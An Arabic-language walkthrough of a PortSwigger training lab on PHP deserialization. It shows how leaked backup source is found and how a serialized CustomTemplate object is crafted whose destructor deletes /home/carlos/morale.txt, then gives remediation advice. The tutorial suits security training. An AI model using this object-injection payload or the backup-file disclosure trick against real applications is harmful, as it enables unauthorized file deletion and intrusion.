# [Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)

## **`الهدف`**
قم بإنشاء كائنًا تسلسليًا خبيثًا، ثم قم بحقنه لحذف ملف `morale.txt` من `Carlos's home directory`.
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` ونقوم بتحويل أى طلب يحتوى على الـ `Cookie` مثل طلب `/my-account` إلى `Repeater`
```http
GET /my-account?id=wiener HTTP/2
Host: 0a3e00c7044aac1681313999001b00f9.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJxejRwenplNmw1ZWV1bWU5OWdyOGU2ZDc3bGYweHAwZSI7fQ%3d%3d
```
وبفحص الاستجابة الخاصة به سنجد بداخلها تعليق من المطور يشير إلى مسار الـ `Source Code`
```http
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
```
وسنقوم بالتوجه إلى هذا المسار ولكن بوضع علامة `~` في نهايته
```http
GET /libs/CustomTemplate.php~ HTTP/2
Host: 0a3e00c7044aac1681313999001b00f9.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJxejRwenplNmw1ZWV1bWU5OWdyOGU2ZDc3bGYweHAwZSI7fQ%3d%3d
```
وسنجد أن الاستجابة تحتوي على الـ `Source Code`
```http
HTTP/2 200 OK
Content-Type: text/plain
X-Frame-Options: SAMEORIGIN
Content-Length: 1130

<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
وبعد فحصه سنكتشف كيفية حل هذا اللاب، ولذلك سنعود إلى أى طلب ونقوم بتظليل الـ `Cookie`وتعديلها من داخل `Inspector` لتصبح كالتالي:
```PHP
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

ثم سنقوم بنسخ الـ `Cookie` الجديد ونتوجه إلى المتصفح ونضغط `F12` ثم  `Application` ونضعه في خانة الـ `Session` داخل الـ `Cookies` ثم نضغط `Enter` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [Modifying serialized objects](./Modifying-serialized-objects.md)

ويجب ألا يعمل تطبيق الويب بصلاحيات مستخدم `Root` ويعمل بصلاحيات مستخدم محدود مثل `www-data` بحيث لا يملك صلاحية التعديل أو الحذف إلا في مجلدات محددة خاصة بالتطبيق مثل `/var/www/html/uploads`.

ويجب إزالة التعليقات البرمجية الحساسة من كود الـ `HTML` الموجه للمستخدم، ويُفضل استخدام أدوات التحزيم `Build Tools` أو الـ `Minifiers` لحذف هذه التعليقات تلقائياً قبل نشر الكود.

ويجب ألا يتم حفظ أي ملفات `Backup` أو `Source Code` أو ملفات تحكم بالإصدارت `Version Control` (مثل `.git`) في المجلدات التي يتم تقديمها للزوار، حيث يجب نقل هذه الملفات إلى مسارات آمنة خارج الـ `Web Root`، أو إزالتها تماماً من سيرفر الإنتاج، ويٌفضل إضافة قاعدة `Rule` في إعدادات سيرفر الويب تمنع بشكل قاطع تقديم أي ملفات تنتهي بهذه الامتدادات، حتى لو نسي المطور مسحها.
